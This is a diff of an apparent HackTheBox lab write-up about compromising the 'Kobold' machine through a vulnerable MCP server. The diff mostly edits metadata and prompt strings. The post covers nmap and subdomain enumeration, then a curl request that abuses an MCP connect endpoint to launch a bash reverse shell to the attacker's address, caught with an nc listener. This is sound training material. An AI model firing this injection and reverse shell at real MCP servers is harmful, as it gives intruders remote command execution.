@@ -1,6 +1,7 @@
 +++
 title = "Kobold - Leveraging a vulnerable MCP server"
 date = 2026-05-13T12:10:30Z
+difficulty = "easy"
 tags = ["HTB - Easy", "Linux", "Pentesting"]
 description = "Pwning the Kobold machine from HTB."
 +++
@@ -9,7 +10,7 @@ description = "Pwning the Kobold machine from HTB."
 ## **RECON**
 After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nmap -sC -sV -oN nmap_tcp.txt 10.129.54.53 --min-rate=10000
 ```
 The scan revealed three open TCP ports for SSH, HTTP, and HTTPS (UDP scans did not show any open ports). Nmap also revealed the domain name for the target machine and a wildcard subdomain:
@@ -49,11 +50,11 @@ The website looked like a template for an AI management service, but it was very
 To find more directories/subdirectories, I ran a gobuster directory scan and an ffuf subdomain enumeration scan.
 ## **ENUMERATION**
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# gobuster dir -u "https://kobold.htb" -w ../SecLists/Discovery/Web-Content/common.txt -t 25 --timeout 20s
 ```
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w ../SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ac
 ```
 The results from the gobuster scan came up empty, however, the subdomain scan identified a point of entry:  
@@ -68,17 +69,17 @@ This [**GitHub Advisory**](https://github.com/advisories/GHSA-232v-j27c-5pp6) li
 &nbsp;  
 So this:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# curl http://10.97.58.83:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
 ```
 Turned to this:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# curl https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.16.37/7777 0>&1"],"env":{}},"serverId":"letmein"}' -k
 ```
 And in another terminal, I had my listener ready to catch the shell:
 ```bash
-┌──(root㉿kali)-[/home/esteban]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nc -lvnp 7777  
 listening on [any] 7777 ...
 ```
